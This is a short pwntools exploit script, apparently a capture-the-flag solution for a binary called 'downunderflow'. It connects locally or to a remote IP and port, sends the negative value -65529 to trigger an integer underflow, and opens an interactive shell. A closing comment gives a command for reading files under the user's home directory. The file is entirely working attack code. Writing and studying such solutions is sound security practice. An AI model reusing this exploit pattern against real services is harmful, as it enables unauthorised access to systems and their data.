from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]


if len(sys.argv) == 1:
    r = process("./downunderflow")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print(len(sys.argv))
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
r.sendlineafter(b"as: ", str(-65529))
r.interactive()

'''
cat /home/`whoami`/f*

'''